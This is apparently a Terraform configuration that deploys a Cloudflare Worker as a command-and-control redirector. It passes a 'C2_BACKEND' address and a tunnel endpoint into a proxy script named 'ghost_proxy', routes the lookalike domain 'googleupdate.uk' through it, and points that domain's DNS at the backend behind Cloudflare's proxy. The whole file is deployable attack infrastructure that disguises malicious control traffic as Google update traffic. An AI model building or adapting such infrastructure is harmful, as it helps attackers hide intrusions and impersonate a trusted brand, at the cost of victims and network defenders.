terraform {
  required_providers {
    cloudflare = {
      source  = "cloudflare/cloudflare"
      version = "~> 4.0"
    }
  }
}

# Read the JavaScript file
data "local_file" "worker_script" {
  filename = var.worker_script_path
}

resource "cloudflare_workers_script" "ghost_proxy" {
  account_id = var.cloudflare_account_id
  name       = "${var.project_name}-proxy-${var.environment}"
  content    = file(var.worker_script_path)
  module     = true

  # Pass the GCP LB IP to the Worker as backend
  plain_text_binding {
    name = "C2_BACKEND"
    text = "http://${var.c2_backend_url}"
  }

  # Local tunnel bridge binding
  plain_text_binding {
    name = "LOCAL_TUNNEL"
    text = "https://${var.local_tunnel_cname}"
  }
}

# --- Route the Worker to the googleupdate.uk domain ---
resource "cloudflare_workers_route" "c2_route" {
  zone_id = var.cloudflare_zone_id
  pattern = "googleupdate.uk/*"
  script_name  = cloudflare_workers_script.ghost_proxy.name
}

# --- Future-Proof DNS Record ---
# Automatically point googleupdate.uk to the ephemeral Load Balancer IP on every deployment
resource "cloudflare_record" "c2_domain_root" {
  zone_id = var.cloudflare_zone_id
  name    = "@"
  content   = var.c2_backend_url
  type    = "A"
  proxied = true
}

